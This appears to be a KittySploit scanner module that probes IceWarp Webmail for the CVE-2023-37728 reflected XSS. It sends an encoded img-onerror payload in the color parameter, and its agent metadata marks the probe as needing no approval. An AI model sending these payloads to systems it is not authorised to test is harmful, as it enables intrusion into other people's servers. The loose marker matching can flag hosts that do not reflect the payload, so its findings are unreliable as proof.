#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Icewarp Icearp v10."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'IceWarp Webmail Server v10.2.1 - Cross Site Scripting Detection',
        'description': 'Icewarp Icearp v10.2.1 was discovered to contain a cross-site scripting (XSS) vulnerability via the color parameter.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2023', 'icearp', 'icewarp', 'xss', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://medium.com/@ayush.engr29/cve-2023-37728-6dfb7586311',
            'https://nvd.nist.gov/vuln/detail/CVE-2023-37728',
            'http://icearp.com',
            'http://icewarp.com',
            'https://medium.com/%40ayush.engr29/cve-2023-37728-6dfb7586311',
        ],
        'cve': 'CVE-2023-37728',
    }

    def run(self):
        for path in ('/webmail/?color=%22%3e%3cimg%20src%20onerror%3dalert(document.domain)%3e%3c%22%27', '/?color=%22%3e%3cimg%20src%20onerror%3dalert(document.domain)%3e%3c%22%27'):
            r = self.http_request(method="GET", path=path, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
            body = r.text or ""
            headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
            body_any = ('text/html', 'IceWarp WebClient', '<img src onerror=alert(document.domain)>',)
            header_any = ('IceWarp',)
            if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
                self.set_info(
                    severity='medium',
                    reason="IceWarp Webmail Server v10.2.1 - Cross Site Scripting detected",
                    path=path,
                )
                return True
        return False

